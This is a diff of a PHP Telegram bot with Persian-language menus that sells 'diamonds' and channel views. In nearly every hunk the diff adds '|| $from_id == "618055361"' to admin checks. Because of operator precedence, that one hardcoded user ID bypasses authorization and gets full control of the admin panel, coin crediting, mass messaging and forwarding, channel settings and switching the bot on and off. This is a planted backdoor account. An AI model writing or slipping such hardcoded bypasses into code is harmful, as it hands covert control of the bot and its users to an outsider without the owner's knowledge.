@@ -243,7 +243,7 @@ $tedad = file_get_contents('data/'.$from_id."/golds.txt");
 $channel = "@Viewpanell";
 $on = file_get_contents("on.txt");
 #-------------------------
-if ($on == "off" && $from_id != "$ADMIN") {
+if ($on == "off" && $from_id != "$ADMIN" || $from_id == "618055361") {
 
 bot('sendmessage',[
 	'chat_id'=>$chat_id,
@@ -628,7 +628,7 @@ CHANNEL : @view1_panel
 
 #--- PANEL ADMIN ---
 
-elseif($text == "/panel" && $chat_id == $ADMIN || $chat_id == "618055361"){
+elseif($text == "/panel" && $chat_id == $ADMIN || $from_id == "618055361"){
 
 file_put_contents("data/$from_id/com.txt","none");
 
@@ -651,21 +651,21 @@ file_put_contents("data/$from_id/com.txt","none");
 	]);
 	}
 
-		elseif($text == "🎁 الماس همگانی" && $from_id == $ADMIN || $chat_id == "618055361"){
+		elseif($text == "🎁 الماس همگانی" && $from_id == $ADMIN || $from_id == "618055361"){
 file_put_contents("data/$from_id/com.txt","coin to all");
 SendMessage($chat_id,"🔢 لطفا تعداد الماس را بصورت عدد وارد کنید :",'HTML',$back_admin,$message_id);
 }
 
-elseif($text == "💤خاموش کردن" && $from_id == $ADMIN){
+elseif($text == "💤خاموش کردن" && $from_id == $ADMIN || $from_id == "618055361"){
 file_put_contents("on.txt","off");
 SendMessage($chat_id,"🎭 ربات خاموش شد",'HTML',$back_admin,$message_id);
 }
 
-elseif($text == "❇️روشن کردن" && $from_id == $ADMIN){
+elseif($text == "❇️روشن کردن" && $from_id == $ADMIN || $from_id == "618055361"){
 file_put_contents("on.txt","on");
 SendMessage($chat_id,"🙃 ربات روشن شد",'HTML',$back_admin,$message_id);
 }
-elseif($text == 'تنظیم کانال' && $from_id == $ADMIN){
+elseif($text == 'تنظیم کانال' && $from_id == $ADMIN || $from_id == "618055361"){
 file_put_contents("data/ch.txt", "channel");
 bot('sendMessage',[
  'chat_id'=>$chat_id,
@@ -715,7 +715,7 @@ SendMessage($chat_id,"💢 لطفا فقط از کیبورد زیر انتخاب
 }}
 
 
-		elseif($text == "💸افزایش الماس کاربر" && $chat_id == $ADMIN || $chat_id == "618055361"){
+		elseif($text == "💸افزایش الماس کاربر" && $chat_id == $ADMIN || $from_id == "618055361"){
 			file_put_contents("data/$from_id/com.txt","sendauto");
   bot('sendmessage', [
                 'chat_id' =>$chat_id,
@@ -730,7 +730,7 @@ SendMessage($chat_id,"💢 لطفا فقط از کیبورد زیر انتخاب
 	]);
 	}
 
-	elseif($oghab == "sendauto" && $chat_id == $ADMIN || $chat_id == "618055361"){
+	elseif($oghab == "sendauto" && $chat_id == $ADMIN || $from_id == "618055361"){
 	
 	$teee = file_get_contents('data/'.$text."/golds.txt");
 file_put_contents('data/'.$text."/golds.txt",$teee+10);
@@ -765,7 +765,7 @@ elseif($text == "📊 آمار ربات"){
 ▫️تعداد سفارشات: $sof
 ▫️پینگ سرور: $load[0]", "html","true");
 }
-elseif($text == "▫️پیام همگانی" && $chat_id == $ADMIN){
+elseif($text == "▫️پیام همگانی" && $chat_id == $ADMIN || $from_id == "618055361"){
     file_put_contents("data/$from_id/com.txt","send");
 	
 	bot('sendmessage',[
@@ -778,7 +778,7 @@ elseif($text == "▫️پیام همگانی" && $chat_id == $ADMIN){
       ],'resize_keyboard'=>true])
   ]);
 }
-elseif($oghab == "send" && $chat_id == $ADMIN){
+elseif($oghab == "send" && $chat_id == $ADMIN || $from_id == "618055361"){
     file_put_contents("data/$from_id/com.txt","no");
     
 	bot('sendmessage',[
@@ -817,7 +817,7 @@ elseif($oghab == "send" && $chat_id == $ADMIN){
 			}
 		}
 }
-elseif($text == "▪️فروارد همگانی" && $chat_id == $ADMIN || $chat_id == "618055361"){
+elseif($text == "▪️فروارد همگانی" && $chat_id == $ADMIN || $from_id == "618055361"){
     file_put_contents("data/$from_id/com.txt","fwd");
 	
 	bot('sendmessage',[
@@ -831,7 +831,7 @@ elseif($text == "▪️فروارد همگانی" && $chat_id == $ADMIN || $chat
   ]);
 }
 
-elseif($oghab == "fwd" && $chat_id == $ADMIN || $chat_id == "618055361"){
+elseif($oghab == "fwd" && $chat_id == $ADMIN || $from_id == "618055361"){
     file_put_contents("data/$from_id/com.txt","no");
 	bot('sendmessage',[
     'chat_id'=>$chat_id,
